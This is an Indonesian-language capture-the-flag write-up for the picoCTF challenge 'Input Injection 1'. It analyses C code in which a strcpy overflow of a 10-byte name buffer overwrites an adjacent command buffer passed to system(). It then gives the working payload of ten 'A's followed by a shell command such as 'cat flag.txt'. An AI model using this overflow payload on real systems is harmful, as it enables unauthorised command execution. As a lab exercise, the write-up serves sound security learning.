

## Info Challenge
**Challenge:** Input Injection 1  
**nc yang dikasih:** `nc amiable-citadel.picoctf.net 57507`  
**file yang dikasih:** `vuln` , `vuln.c` 

## Solusi

### 1. Analisis Kode


```c
void fun(char *name, char *cmd) {
    char c[10];        
    char buffer[10];  
    
    strcpy(c, cmd);
    strcpy(buffer, name); 
    
    printf("Goodbye, %s!\n", buffer);
    system(c); 
}
```

**vuln ketemu tuh:** buffer overflow di `strcpy(buffer, name)`. karena `c` dan `buffer` mereka bersebelahan, overflow atau kelebihan pada `buffer` bisa menimpa `c` jadi intinya kalo kita input nama dan kelebihan kita bisa akses c .

### 2. Testing Program
Coba konek normal:
```
$ nc amiable-citadel.picoctf.net 57507
What is your name?
test
Goodbye, test!
Linux
```
aman saja disini berfungsi denhan baik

### 3. Cari Panjang Overflow
Kita perlu overflow `buffer[10]` ke `c[10]` perlu mengisi:
- `buffer[10]` penuh (10 bytes)
- Plus cukup untuk timpa "uname" di `c`

Coba dengan 10 'A':
```
AAAAAAAAAA
Goodbye, AAAAAAAAAA!
Linux  # masih "uname"
```

### 4. Exploit
Coba overflow dengan command baru setelah 10 'A':
```
AAAAAAAAAAls
```
Hasil:
```
Goodbye, AAAAAAAAAAls!
flag.txt
vuln
vuln.c
```
Berhasil! Buffer `c` sekarang berisi "ls" bukan "uname".

### 5. Dapatkan Flag
Ganti "ls" dengan "cat flag.txt":
```
AAAAAAAAAAcat flag.txt
```
Hasil:
```
Goodbye, AAAAAAAAAAcat flag.txt!

```

## Flag
`flag`
